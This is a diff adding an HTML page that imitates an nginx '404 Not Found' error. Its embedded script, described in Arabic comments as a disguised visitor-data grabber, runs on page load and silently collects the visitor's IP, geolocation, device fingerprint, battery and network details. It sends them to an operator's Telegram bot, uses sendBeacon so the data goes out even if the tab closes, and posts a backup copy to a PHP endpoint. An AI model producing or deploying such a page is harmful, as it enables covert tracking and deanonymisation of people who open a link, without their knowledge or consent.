@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>404 Not Found</title>
+<style>
+    /* شكل يقلد صفحة أخطاء nginx الحقيقية */
+    html { background: #ffffff; }
+    body {
+        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+        color: #333; text-align: center;
+        padding-top: 12%;
+    }
+    h1 { font-size: 2.6em; font-weight: 500; margin: 0 0 12px; }
+    hr { width: 260px; border: 0; border-top: 1px solid #e0e0e0; margin: 0 auto 12px; }
+    p  { color: #888; font-size: 0.9em; }
+</style>
+</head>
+<body>
+    <h1>404 Not Found</h1>
+    <hr>
+    <p>nginx/1.24.0</p>
+
+<script>
+/* ============================================================
+   GHOST-404 v2 — صفحة 404 متخفية تجمع بيانات الزائر
+   ------------------------------------------------------------
+   - تظهر للمستخدم صفحة 404 عادية جداً
+   - تجمع بصمت: IP + الموقع التقريبي + بصمة الجهاز + الشبكة
+   - ترسل كل حاجة لبوت تيليجرام مباشرة من المتصفح
+   - (اختياري) نسخة احتياطية لـ index.php على سيرفرك
+   ============================================================ */
+
+// ================= 1) الإعدادات =================
+const CONFIG = {
+    // توكن البوت من @BotFather — مثال: 123456789:AAH...xyz
+    TG_TOKEN: "ضع_التوكن_هنا",
+
+    // chat_id:
+    // - محادثة خاصة: رقم زي 123456789 (من getUpdates أو @userinfobot)
+    // - قناة: يوزر القناة زي @mychannel (وبوت يكون أدمن فيها)
+    TG_CHAT_ID: "ضع_الايدي_هنا",
+
+    // لو خليتها true هتطلب إذن الموقع (دقة عالية لكن تظهر نافذة للمستخدم
+    // فتكسر إيحاء الـ 404 — الافتراضي false = موقع تقريبي من الـ IP)
+    ENABLE_GPS: false,
+
+    // نسخة احتياطية لسيرفرك (اختياري) — اتركها "" لو مش محتاجها
+    PHP_BACKUP: "index.php",
+
+    MAX_RETRY: 3
+};
+// ================================================
+
+/* ---------- 2) جلب الـ IP والموقع من APIs عامة ---------- */
+async function getIPInfo() {
+    const sources = [
+        {
+            url: 'https://ipwho.is/',
+            map: d => ({
+                ip: d.ip, country: d.country, city: d.city, region: d.region,
+                isp: d.connection ? d.connection.isp : '',
+                asn: d.connection ? d.connection.asn : '',
+                lat: d.latitude, lon: d.longitude,
+                timezone: d.timezone ? d.timezone.id : ''
+            })
+        },
+        {
+            url: 'https://ipapi.co/json/',
+            map: d => ({
+                ip: d.ip, country: d.country_name, city: d.city, region: d.region,
+                isp: d.org, asn: d.asn,
+                lat: d.latitude, lon: d.longitude, timezone: d.timezone
+            })
+        },
+        {
+            url: 'https://api.ipify.org?format=json',
+            map: d => ({ ip: d.ip }) // IP فقط كخطة أخيرة
+        }
+    ];
+
+    for (const s of sources) {
+        try {
+            const ctrl = new AbortController();
+            const t = setTimeout(() => ctrl.abort(), 6000);
+            const res = await fetch(s.url, { signal: ctrl.signal });
+            clearTimeout(t);
+            const d = await res.json();
+            const m = s.map(d);
+            if (m.ip) {
+                // لو جبنا الـ IP بس (من ipify)، نجيب باقي التفاصيل بيه
+                if (!m.country) {
+                    try {
+                        const geo = await (await fetch('https://ipwho.is/' + m.ip)).json();
+                        m.country = geo.country; m.city = geo.city; m.region = geo.region;
+                        m.isp = geo.connection ? geo.connection.isp : '';
+                        m.lat = geo.latitude; m.lon = geo.longitude;
+                        m.timezone = geo.timezone ? geo.timezone.id : '';
+                    } catch (e) {}
+                }
+                return m;
+            }
+        } catch (e) { /* نجرب المصدر اللي بعده */ }
+    }
+    return { ip: 'غير متاح' };
+}
+
+/* ---------- 3) بصمة الجهاز ---------- */
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    return {
+        user_agent: ua,
+        os: detectOS(ua),
+        browser: detectBrowser(ua),
+        platform: navigator.platform || '',
+        device_type: /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile/Tablet' : 'Desktop',
+        screen: screen.width + 'x' + screen.height,
+        color_depth: screen.colorDepth + 'bit',
+        dpr: window.devicePixelRatio || 1,
+        language: navigator.language,
+        languages: (navigator.languages || []).join(', '),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+        tz_offset: new Date().getTimezoneOffset(),
+        cookies: navigator.cookieEnabled,
+        cores: navigator.hardwareConcurrency || '',
+        memory: navigator.deviceMemory || '',
+        touch: 'ontouchstart' in window,
+        online: navigator.onLine,
+        local_time: new Date().toString()
+    };
+}
+
+function detectOS(ua) {
+    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+    if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
+    if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
+    if (/Android/.test(ua)) return 'Android';
+    if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+    if (/Mac OS X/.test(ua)) return 'macOS';
+    if (/CrOS/.test(ua)) return 'Chrome OS';
+    if (/Linux/.test(ua)) return 'Linux';
+    return 'Unknown';
+}
+
+function detectBrowser(ua) {
+    if (/Edg\//.test(ua)) return 'Edge';
+    if (/OPR|Opera/.test(ua)) return 'Opera';
+    if (/Firefox\//.test(ua)) return 'Firefox';
+    if (/Chrome\//.test(ua)) return 'Chrome';
+    if (/Safari\//.test(ua)) return 'Safari';
+    return 'Unknown';
+}
+
+/* ---------- 4) البطارية + الشبكة ---------- */
+async function getExtra() {
+    const x = {};
+    if (navigator.getBattery) {
+        try {
+            const b = await navigator.getBattery();
+            x.battery = Math.round(b.level * 100) + '%' + (b.charging ? ' (charging)' : '');
+        } catch (e) {}
+    }
+    if (navigator.connection) {
+        const c = navigator.connection;
+        x.network = (c.effectiveType || '') + ' @ ' + (c.downlink || '?') + ' Mbps';
+    }
+    return x;
+}
+
+/* ---------- 5) GPS (اختياري) ---------- */
+function tryGetGPS() {
+    return new Promise(resolve => {
+        if (!CONFIG.ENABLE_GPS || !navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+            p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy) + 'm' }),
+            () => resolve(null),
+            { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
+        );
+        setTimeout(() => resolve(null), 10000); // مهلة حماية
+    });
+}
+
+/* ---------- 6) الإرسال لتليجرام ---------- */
+async function sendToTelegram(text) {
+    if (!CONFIG.TG_TOKEN || CONFIG.TG_TOKEN.indexOf('ضع') === 0) return false;
+    const url = 'https://api.telegram.org/bot' + CONFIG.TG_TOKEN + '/sendMessage';
+    const body = JSON.stringify({ chat_id: CONFIG.TG_CHAT_ID, text: text, disable_web_page_preview: true });
+
+    for (let i = 1; i <= CONFIG.MAX_RETRY; i++) {
+        try {
+            const res = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: body,
+                keepalive: true
+            });
+            const j = await res.json();
+            if (j.ok) return true;
+        } catch (e) {}
+        await new Promise(r => setTimeout(r, 1200 * i));
+    }
+
+    // خطة أخيرة: sendBeacon — يرسل حتى لو المستخدم قفل الصفحة
+    try {
+        const blob = new Blob([body], { type: 'application/json' });
+        navigator.sendBeacon(url, blob);
+    } catch (e) {}
+    return false;
+}
+
+/* ---------- 7) نسخة احتياطية لسيرفرك ---------- */
+function sendBackup(payload) {
+    if (!CONFIG.PHP_BACKUP) return;
+    try {
+        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+        navigator.sendBeacon(CONFIG.PHP_BACKUP, blob);
+    } catch (e) {}
+}
+
+/* ---------- 8) تنسيق الرسالة ---------- */
+function buildMessage(p) {
+    const ip = p.ip_info || {}, d = p.device || {}, x = p.extra || {}, g = p.gps;
+    const loc = [ip.country, ip.city, ip.region].filter(Boolean).join(' - ') || 'Unknown';
+    const coords = (ip.lat && ip.lon) ? ip.lat + ', ' + ip.lon : (g ? g.lat + ', ' + g.lon : 'N/A');
+
+    let msg = '';
+    msg += '== New Visitor Captured ==\n';
+    msg += 'Time: ' + p.timestamp + '\n';
+    msg += 'Page: ' + p.page + '\n';
+    msg += 'Referrer: ' + (p.referrer || 'Direct') + '\n';
+    msg += '-----------------------------\n';
+    msg += 'IP: ' + ip.ip + '\n';
+    msg += 'Location: ' + loc + '\n';
+    msg += 'Coords: ' + coords + '\n';
+    if (ip.lat && ip.lon) msg += 'Maps: https://maps.google.com/?q=' + ip.lat + ',' + ip.lon + '\n';
+    msg += 'ISP/ASN: ' + (ip.isp || 'N/A') + (ip.asn ? ' (AS' + ip.asn + ')' : '') + '\n';
+    if (g) msg += 'GPS: ' + g.lat + ', ' + g.lon + ' (accuracy ' + g.acc + ')\n';
+    msg += '-----------------------------\n';
+    msg += 'Device: ' + d.device_type + ' | ' + d.os + ' | ' + d.browser + '\n';
+    msg += 'Platform: ' + d.platform + '\n';
+    msg += 'Screen: ' + d.screen + ' (' + d.dpr + 'x DPR)\n';
+    msg += 'Language: ' + d.language + '\n';
+    msg += 'Timezone: ' + d.timezone + ' (UTC' + (d.tz_offset >= 0 ? '+' : '') + (-d.tz_offset / 60) + ')\n';
+    msg += 'Cores/Memory: ' + (d.cores || '?') + ' cores / ' + (d.memory || '?') + ' GB\n';
+    msg += 'Battery: ' + (x.battery || 'N/A') + '\n';
+    msg += 'Network: ' + (x.network || 'N/A') + '\n';
+    msg += 'Touch: ' + (d.touch ? 'Yes' : 'No') + '\n';
+    msg += '-----------------------------\n';
+    msg += 'UA: ' + d.user_agent;
+    return msg;
+}
+
+/* ---------- 9) التشغيل ---------- */
+(async function run() {
+    const [ip_info, device, extra] = await Promise.all([
+        getIPInfo(),
+        Promise.resolve(getDeviceInfo()),
+        getExtra()
+    ]);
+
+    const gps = CONFIG.ENABLE_GPS ? await tryGetGPS() : null;
+
+    const payload = {
+        timestamp: new Date().toISOString(),
+        page: window.location.href,
+        referrer: document.referrer,
+        ip_info: ip_info,
+        device: device,
+        extra: extra,
+        gps: gps
+    };
+
+    const msg = buildMessage(payload);
+    let sent = false;
+
+    sendToTelegram(msg).then(ok => { sent = ok; });
+    sendBackup(payload);
+
+    // ضمان إضافي: لو قفل الصفحة قبل ما الإرسال يكمل
+    window.addEventListener('pagehide', () => {
+        if (!sent && CONFIG.TG_TOKEN.indexOf('ضع') !== 0) {
+            try {
+                const url = 'https://api.telegram.org/bot' + CONFIG.TG_TOKEN + '/sendMessage';
+                const body = JSON.stringify({ chat_id: CONFIG.TG_CHAT_ID, text: msg, disable_web_page_preview: true });
+                navigator.sendBeacon(url, new Blob([body], { type: 'application/json' }));
+            } catch (e) {}
+        }
+    });
+})();
+</script>
+</body>
+</html>
